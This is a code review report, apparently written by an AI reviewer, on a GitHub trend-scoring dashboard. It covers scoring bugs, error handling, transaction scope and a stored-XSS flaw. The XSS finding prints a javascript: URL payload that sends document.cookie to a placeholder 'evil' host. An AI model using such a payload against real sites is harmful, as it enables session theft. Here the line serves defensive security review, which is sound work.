---
phase: 01-foundation-first-signal-github-scored-and-visible
reviewed: 2026-07-19T00:00:00Z
depth: standard
files_reviewed: 45
files_reviewed_list:
  - techtrend/__init__.py
  - techtrend/config.py
  - techtrend/logging_setup.py
  - techtrend/ingest.py
  - techtrend/score.py
  - techtrend/collectors/__init__.py
  - techtrend/collectors/base.py
  - techtrend/collectors/github.py
  - techtrend/collectors/http.py
  - techtrend/collectors/registry.py
  - techtrend/collectors/backfill.py
  - techtrend/db/__init__.py
  - techtrend/db/connection.py
  - techtrend/db/schema.sql
  - techtrend/pipeline/__init__.py
  - techtrend/pipeline/identity.py
  - techtrend/pipeline/snapshot.py
  - techtrend/pipeline/orchestrator.py
  - techtrend/pipeline/docs_link.py
  - techtrend/pipeline/score.py
  - techtrend/pipeline/normalize.py
  - techtrend/pipeline/stability.py
  - techtrend/pipeline/backfill_runner.py
  - techtrend/server/__init__.py
  - techtrend/server/app.py
  - techtrend/server/queries.py
  - techtrend/server/health.py
  - techtrend/web/templates/dashboard.html
  - techtrend/web/templates/partials/table.html
  - techtrend/web/templates/partials/health_strip.html
  - techtrend/web/static/style.css
  - tests/conftest.py
  - tests/test_storage.py
  - tests/test_skeleton.py
  - tests/test_collect_github.py
  - tests/test_idempotency.py
  - tests/test_docs_link.py
  - tests/test_scoring.py
  - tests/test_stability.py
  - tests/test_backfill.py
  - tests/test_dashboard.py
  - tests/test_health.py
  - config/tracked.toml
  - pyproject.toml
  - .env.example
findings:
  critical: 3
  warning: 5
  info: 3
  total: 11
status: issues_found
---

# Phase 01: Code Review Report

**Reviewed:** 2026-07-19
**Depth:** standard (cross-file tracing performed on the explicitly flagged high-risk areas per reviewer brief)
**Files Reviewed:** 45
**Status:** issues_found

## Summary

The vertical slice is well-structured and the documented Phase 1 decisions (D-01..D-17,
D-08a) are faithfully implemented where I checked them directly — the floor-before-Wilson
ordering, the docs-link honesty chain, the collector-failure isolation, the
`MAX(run_date)` pinning in `server/queries.py`, and the idempotent upserts are all correct
and match their design docs.

However, three provable defects would ship broken or unsafe behavior: (1) the SCORE-05
day-to-day stability metric (D-12's explicit "measure before optimizing" instrument) is
permanently non-functional in production because `rescore_all`'s `DELETE FROM scores`
is unscoped by `run_date` and destroys the previous day's rows before
`log_stability` ever runs against them; (2) a stored XSS vector exists in the docs-link
`href` — GitHub's `homepage` field is attacker-settable arbitrary text with no scheme
validation anywhere in the pipeline, and it is rendered directly into an anchor `href`;
(3) the dashboard route calls `load_config()` and opens its DB connection *outside* the
try/except that is supposed to catch read failures, so a malformed config file or a
corrupted `techtrend.db` produces a raw framework traceback — the exact failure mode
the UI-SPEC explicitly requires to degrade to readable copy instead.

Five further warnings cover a partial-commit-on-failure data-integrity gap in scoring, a
provenance-label bug in `write_snapshot`, a non-monotonic-series bug in the velocity
window calculation, an overly narrow exception filter in GitHub discovery, and a
long-held write transaction in the backfill runner.

## Critical Issues

### CR-01: SCORE-05 stability metric is permanently broken by `rescore_all`'s unscoped DELETE

**File:** `techtrend/pipeline/score.py:146`
**Issue:**

```python
conn.execute("DELETE FROM scores WHERE score_version = ?", (CURRENT_SCORE_VERSION,))
```

This deletes **every row** at `CURRENT_SCORE_VERSION` regardless of `run_date`, not just
the row for the run currently being scored. `techtrend/pipeline/stability.py:43-53`
(`_previous_run_date`) depends on a *prior* `run_date`'s rows still being present in
`scores` in order to compute the day-to-day Jaccard overlap that D-12 explicitly
requires ("log a stability metric each run ... so the need for further smoothing is
discovered empirically rather than guessed").

Trace the actual production call sequence in `techtrend/score.py:42-43`:

```python
written = rescore_all(conn, config, run_date)          # deletes ALL prior run_dates, inserts today's
log_stability(conn, run_date, config.tunables.stability_top_n)  # queries "run_date < today" — finds nothing
```

Concrete failure scenario: day 1, `rescore_all` deletes nothing (table empty), inserts
day-1 rows. `log_stability` correctly reports the "day one" case. Day 2:
`rescore_all` deletes **day 1's rows too** (no `run_date` filter) before inserting
day-2 rows. `log_stability`'s `_previous_run_date` query (`WHERE run_date < '<day2>'`)
now finds nothing, because day 1's rows no longer exist — they were just deleted by the
same function call that ran two lines earlier. `prev` is always the empty set, `curr` is
non-empty once any entity is eligible, so `rank_overlap` returns `0.0` **every single
day, forever**, regardless of how stable the actual ranking is. This fires a WARNING log
line every run and permanently defeats the instrument D-12 was designed to provide —
worse, it could mislead a future maintainer into adding the damping/hysteresis D-12
explicitly rejected, based on a metric that has never once measured real day-over-day
overlap.

This is not caught by `tests/test_stability.py` because those tests insert `scores` rows
for two `run_date`s directly, bypassing `rescore_all`'s DELETE entirely — the test
fixtures never exercise the real `rescore_all` → `log_stability` sequence together.

**Fix:** Scope the DELETE to the run being (re)scored, not the whole score_version, so
historical run_dates accumulate and `log_stability`'s cross-day comparison has something
to compare against. `server/queries.py` already defensively pins to `MAX(run_date)` and
has a regression test proving multiple `run_date` rows coexist safely, so this is a safe
change:

```python
conn.execute(
    "DELETE FROM scores WHERE score_version = ? AND run_date = ?",
    (CURRENT_SCORE_VERSION, run_date_str),
)
```

Add an integration test that calls `rescore_all` twice on two different `run_date`s
against the same connection and then calls `log_stability`, asserting `prev_run_date` is
found and the overlap is not trivially `0.0`/`1.0` by construction.

---

### CR-02: Stored XSS via unvalidated `homepage`/`docs_url` scheme rendered into `href`

**File:** `techtrend/pipeline/docs_link.py:66-68`, `techtrend/collectors/base.py:37`,
`techtrend/web/templates/partials/table.html:44`
**Issue:** GitHub's repo `homepage` field is attacker-controlled free text (any GitHub
user can set it on their own public repo to any string) and is never validated as an
`http(s)` URL anywhere in the pipeline:

- `techtrend/collectors/base.py:37` — `homepage: str | None = None` on `CollectedItem`
  (plain `str`, not `pydantic.HttpUrl` or any scheme-constrained type).
- `techtrend/pipeline/docs_link.py:66-68`:
  ```python
  homepage = (repo_meta.get("homepage") or "").strip()
  if homepage:
      return homepage, "homepage"
  ```
  returns the raw string unchanged as `docs_url`.
- `techtrend/pipeline/identity.py:43-73` writes that value straight into
  `entities.docs_url` with no scheme check.
- `techtrend/web/templates/partials/table.html:44`:
  ```html
  <a href="{{ row['docs_url'] if row['docs_url'] else row['url'] }}">{{ 'Docs' if ... else 'Repo' }}</a>
  ```
  Jinja2's default autoescaping neutralizes `<`/`>`/quotes in text and attribute *values*,
  but it does **not** filter the URL *scheme*. A repo with
  `homepage = "javascript:fetch('https://evil/steal?c='+document.cookie)"` (or any repo
  the discovery search admits — the discovery pass explicitly targets brand-new,
  self-tagged AI/coding repos, i.e. exactly the kind of low-reputation repo most likely to
  be adversarial) renders as `<a href="javascript:fetch(...)">Docs</a>`. Any user of this
  single-user dashboard who clicks that "Docs" link executes attacker JS in the page's
  origin.

This is exactly the scenario the review brief called out ("Verify no `|safe` on external
data and that URL attributes can't carry `javascript:` schemes") and is reachable through
the collector's own discovery mechanism (D-01/D-03), not just force-include.

**Fix:** Reject non-`http(s)` schemes at the point `resolve_docs_url` accepts a homepage
(or as a `CollectedItem` validator), falling back to the honest `'repo'` label exactly as
it already does for an empty homepage:

```python
_ALLOWED_SCHEMES = ("http://", "https://")

def resolve_docs_url(repo_meta: dict, readme_text: str | None) -> tuple[str, str]:
    homepage = (repo_meta.get("homepage") or "").strip()
    if homepage and homepage.lower().startswith(_ALLOWED_SCHEMES):
        return homepage, "homepage"
    ...
```

Apply the same scheme check to the README-link branch (`_extract_links` already
constrains matches to `https?://` via regex, so that branch is currently safe — but add a
test asserting it stays that way) and add a regression test asserting
`resolve_docs_url({"homepage": "javascript:alert(1)", ...}, None)` returns `("...", "repo")`,
never `("javascript:alert(1)", "homepage")`.

---

### CR-03: Dashboard route can crash with a raw framework traceback on config/DB failure

**File:** `techtrend/server/app.py:36-42`, `techtrend/server/app.py:57-64`
**Issue:** The UI-SPEC's explicit contract (`01-UI-SPEC.md` Copywriting Contract, "Error
state — DB unreadable") requires: *"Dashboard couldn't read the database ... (never a raw
framework traceback)."* The implementation only wraps the query calls:

```python
def get_conn():
    conn = connect()          # <-- line 38, OUTSIDE any try/except
    try:
        yield conn
    finally:
        conn.close()

@app.get("/", response_class=HTMLResponse)
def dashboard(...):
    ...
    config = load_config()    # <-- line 57, OUTSIDE the try/except below

    try:
        rows, applied_sort = query_ranked(conn, sort=sort)
        partial_history_count = query_partial_history_count(conn, config.tunables.window_days)
        health = health_status(conn, config, datetime.now(UTC))
    except sqlite3.Error:
        db_error = DB_UNREADABLE_MESSAGE
```

Two concrete ways to trigger an unhandled exception that FastAPI's default handler turns
into a raw 500 traceback:

1. `connect()` (`techtrend/db/connection.py:24-28`) immediately runs
   `PRAGMA journal_mode=WAL` on the freshly opened connection. If `techtrend.db` exists
   but is corrupted/not a valid SQLite file, this raises `sqlite3.DatabaseError` — but it
   happens inside the `get_conn` **dependency**, before `dashboard()`'s body (and its
   `except sqlite3.Error`) ever runs. FastAPI dependencies are not covered by a route's
   own try/except.
2. `load_config()` (`techtrend/config.py:57-65`) reads `config/tracked.toml` relative to
   the process's CWD and raises `FileNotFoundError`/`tomllib.TOMLDecodeError`/a Pydantic
   `ValidationError` on a missing or malformed file — none of which are `sqlite3.Error`,
   and the call happens at line 57, before the `try:` at line 59.

Either case reaches the user as an unhandled-exception 500 page (or, depending on
deployment, an actual Python traceback), directly contradicting D-17/UI-SPEC's "never a
raw traceback" requirement and leaking internal file paths to whoever is looking at the
screen.

**Fix:** Move both fallible calls inside the same defensive boundary, and broaden the
except clause to cover config/read failures generically rather than only `sqlite3.Error`:

```python
@app.get("/", response_class=HTMLResponse)
def dashboard(request: Request, sort: str = "velocity") -> HTMLResponse:
    db_error = None
    rows, applied_sort, partial_history_count, health = [], sort, 0, None
    try:
        config = load_config()
        conn = connect()
        try:
            rows, applied_sort = query_ranked(conn, sort=sort)
            partial_history_count = query_partial_history_count(conn, config.tunables.window_days)
            health = health_status(conn, config, datetime.now(UTC))
        finally:
            conn.close()
    except (sqlite3.Error, OSError, ValueError) as exc:
        logger.warning("stage=dashboard status=read_failed error=%s", exc)
        db_error = DB_UNREADABLE_MESSAGE
    ...
```

Add a test that points `DEFAULT_DB_PATH`/config path at a corrupted file and asserts the
response is a 200 with the `db_error` copy, not a 500.

## Warnings

### WR-01: Score-stage failure is invisible in the health strip, and a mid-loop failure can commit partial rankings

**File:** `techtrend/pipeline/score.py:131-181`, `techtrend/score.py:41-72`,
`techtrend/server/health.py:77-99`
**Issue:** `rescore_all` deletes then loops-and-inserts without any per-entity isolation
or intermediate commit; the only `conn.commit()` is at line 179, after the full entity
loop. If any single entity raises inside that loop (e.g. an unexpected data shape),
`techtrend/score.py`'s outer `except Exception as exc:` (lines 58-72) catches it, records
a `'failed'` run_manifest row, and then calls `conn.commit()` (line 71) — which commits
the **same transaction** that already contains the DELETE and whatever partial set of
INSERTs completed before the failure. The result: `scores` ends up with an incomplete
subset of entities for that `run_date`, silently presented by `query_ranked` (pinned to
`MAX(run_date)`) as if it were the complete, current ranking.

Compounding this, `techtrend/server/health.py`'s `_latest_collector_stage` (line 77) and
`_trailing_average_non_trivial` only ever query `stage LIKE 'collect:%'` — the `'score'`
stage's status is never inspected by `health_status()`. A failed or partial score run
that happens on a day when the collector itself succeeded renders the health strip as
`normal`, with no user-visible signal that the ranked table is now stale/incomplete
(`techtrend/score.py`'s own docstring claims "a stale scores table after a failed run
must leave a visible trace, never a silent one (T-01-20)" — that trace exists only in
`run_manifest`/the log file, not on the dashboard itself).

**Fix:** Have `health_status()` also check the most recent `'score'` stage row (same
pattern as `_latest_collector_stage`, generalized to any stage prefix or a small
allow-list `('collect:github', 'score')`) and escalate to `critical` on `'failed'`. For
the partial-commit issue, either wrap the per-entity insert loop in its own savepoint/
rollback-on-error so a partial run never gets silently committed, or accept the
partial-commit as recoverable-by-next-run but make that explicit in a comment/test.

### WR-02: `write_snapshot`'s upsert can silently mislabel provenance

**File:** `techtrend/pipeline/snapshot.py:25-31`
**Issue:**

```python
INSERT INTO snapshots (entity_id, collected_at, metric_name, metric_value, source_kind)
VALUES (:entity_id, :collected_at, :metric_name, :metric_value, :source_kind)
ON CONFLICT(entity_id, collected_at, metric_name) DO UPDATE SET
    metric_value = excluded.metric_value
```

The `ON CONFLICT` clause updates `metric_value` but never `source_kind`. D-07's design
intent is explicit: *"the provenance flag keeps estimates auditable."* If a row already
exists with one `source_kind` and a later write for the same `(entity_id, collected_at,
metric_name)` supplies a different `source_kind` (e.g. a backfill point whose derived
date happens to coincide with a day that already has an `'observed'` row for a
fast-growing, currently-starring repo — exactly the repos this dashboard is built to
surface), the stored row keeps its *original* `source_kind` even though `metric_value`
was just overwritten by the other write path's value. The provenance column can end up
describing where the data used to come from, not where the currently-stored value came
from.

**Fix:** Either update `source_kind` in the `DO UPDATE SET` clause too (`source_kind =
excluded.source_kind`), or — if "observed always wins over backfill for the same day" is
the intended policy — make that explicit with a `CASE` expression rather than an
implicit omission:

```python
ON CONFLICT(entity_id, collected_at, metric_name) DO UPDATE SET
    metric_value = excluded.metric_value,
    source_kind = excluded.source_kind
```

Add a test that writes an `'observed'` row then a `'backfill'` row for the same
`(entity_id, collected_at, metric_name)` and asserts the resulting `source_kind` matches
whichever policy is chosen.

### WR-03: `compute_window_gain` uses max−min over the window, not last−first

**File:** `techtrend/pipeline/score.py:115-119`
**Issue:**

```python
in_window = [r for r in rows if date.fromisoformat(r["collected_at"]) >= window_start]
values = [r["metric_value"] for r in in_window]

stars_gained = max(values) - min(values)
stars_total = values[-1]
```

`stars_gained` is computed as the peak-to-trough range across every snapshot in the
window, while `stars_total` uses the *latest* value. These are inconsistent bases. GitHub
star counts are not strictly monotonic (unstars happen, and the D-05/D-08a backfill path
itself derives estimated cumulative counts from sampled pages, which are not guaranteed
monotonic point-to-point). Concrete failure scenario: a window with values `[100, 150,
90]` (an early spike that later partially reverses) — the true "gained across the
window" (last − first) is `90 − 100 = -10` (a net loss), but the current code computes
`max(150) − min(90) = 60`, reporting a large *gain* for a repo that actually lost stars
over the window. This can push a genuinely-declining repo over the SCORE-03 floor and
onto the ranked dashboard, which is precisely the small-number/noise failure mode
SCORE-02/SCORE-03 exist to prevent.

**Fix:** Use the window's first and last snapshot values directly:

```python
stars_gained = values[-1] - values[0]
stars_total = values[-1]
```

(If the amount of any-direction *movement* rather than net change is actually wanted,
that should be a documented, deliberate choice with a test asserting the non-monotonic
case, not an incidental side effect of `max`/`min`.)

### WR-04: GitHub discovery only isolates `HTTPStatusError`, not transport-level failures

**File:** `techtrend/collectors/github.py:175-187`
**Issue:**

```python
for label, query in passes:
    try:
        page = _search_page(client, query)
    except httpx.HTTPStatusError as exc:
        logger.warning(...)
        continue
    ...
```

The module's own docstring states discovery is "additive on top of the seed list, never
a hard dependency" and "A search-pass failure is logged and skipped rather than aborting
the whole collector run." That's only true for HTTP-status failures. `_search_page` is
wrapped in `tenacity.retry(retry=tenacity.retry_if_exception(is_retryable))`, and
`is_retryable` (`techtrend/collectors/http.py:97-103`) only recognizes
`httpx.HTTPStatusError` — a `httpx.ConnectError`/`httpx.ReadTimeout`/other
`httpx.TransportError` is not retried and is not caught by the `except
httpx.HTTPStatusError` here either. It propagates out of `_discover` → `fetch()` →
`run_collection`'s outer `except Exception`, which marks the **entire** `collect:github`
stage `'failed'` for that run — including the seed-list repos, which don't need
discovery to succeed at all. A single transient DNS blip or timeout during the discovery
search therefore blocks the whole day's GitHub collection, not just the discovery
enhancement.

**Fix:** Broaden the except clause (or catch `httpx.TransportError` alongside
`httpx.HTTPStatusError`) so a network-level discovery failure degrades the same way a
status-level one does:

```python
except (httpx.HTTPStatusError, httpx.TransportError) as exc:
    logger.warning("stage=collect:github discovery=%s error=%s note=search pass skipped", label, exc)
    continue
```

### WR-05: Backfill holds one long-lived write transaction across many sequential network calls

**File:** `techtrend/pipeline/backfill_runner.py:108-164`
**Issue:** `run_backfill`'s single `conn.commit()` (line 164) happens only after the
entire `for entity in candidates:` loop completes. Each iteration can perform a live
network call (`sample_stargazer_history`, up to `backfill_request_cap` requests, each
individually retried by tenacity with exponential backoff up to 60s per attempt per
`techtrend/collectors/backfill.py`'s `_STARGAZER_RETRY_KWARGS`... actually the tightened
backfill retry schedule caps at 0.2s, but `github.py`'s live-collection retry schedule
elsewhere in the same run can still be slow) while a write transaction from an earlier
iteration's `write_snapshot`/`_set_backfill_status` calls sits open and uncommitted. If
the process is interrupted (Task Scheduler kill on timeout, machine sleep, `Ctrl+C`)
before that final commit, **every** entity processed so far in the run is lost —
including entities that fully succeeded and consumed real rate-limit budget — because
nothing was durably persisted. The next run re-attempts them from `'pending'`/whatever
status they still show, silently re-spending the same request budget.

**Fix:** Commit per-entity (or in small batches) inside the loop rather than once at the
end, so a mid-run interruption preserves already-completed work:

```python
for entity in candidates:
    ...
    conn.commit()   # after each entity's status/snapshot writes
```

## Info

### IN-01: `backfill_request_cap = 0` causes an uncaught `ZeroDivisionError` inside `_select_page_indices`

**File:** `techtrend/collectors/backfill.py:139`, `techtrend/config.py:38`
**Issue:** `Tunables.backfill_request_cap` has no lower-bound constraint
(`backfill_request_cap: int = 20`, plain `int`). If a user sets it to `0` in
`config/tracked.toml`, `_select_page_indices` computes `stride = last_page /
request_cap` (line 139), raising `ZeroDivisionError`. This is caught non-fatally by
`backfill_runner.run_backfill`'s per-entity `except Exception` (so it degrades to a
`'failed'` status per entity rather than crashing the run), but the root cause is an
unvalidated config value.
**Fix:** Add a Pydantic constraint, e.g. `backfill_request_cap: int = Field(default=20, ge=1)`.

### IN-02: Discovery search only reads the first 100 results per pass

**File:** `techtrend/collectors/github.py:104-111`
**Issue:** `_search_page` requests `per_page=100` and is never paginated further — if a
topics/keywords search matches more than 100 repos, everything past the first page is
silently never considered for admission. Documented nowhere as a known limit. Low
severity since D-01/D-03 treat discovery as best-effort/additive, but worth a one-line
docstring note or a config-driven page count so it's a deliberate choice rather than an
implicit one.

### IN-03: `run_manifest.item_count` for the collector stage counts raw fetched items, not admitted entities

**File:** `techtrend/pipeline/orchestrator.py:100-123`
**Issue:** `item_count = len(raw_items)` counts everything `collector.fetch()` returned,
even though `resolve_entity` can reject an item (null/empty `source_native_id`) inside
the loop and `continue` without incrementing any counter. The recorded `item_count` can
therefore overstate how many entities/snapshots were actually written this run. Purely a
health-strip/observability accuracy nit — the zero-items floor check in
`techtrend/server/health.py` still works correctly since a wholesale collector failure
still yields `item_count = 0`.

---

_Reviewed: 2026-07-19_
_Reviewer: Claude (gsd-code-reviewer)_
_Depth: standard_
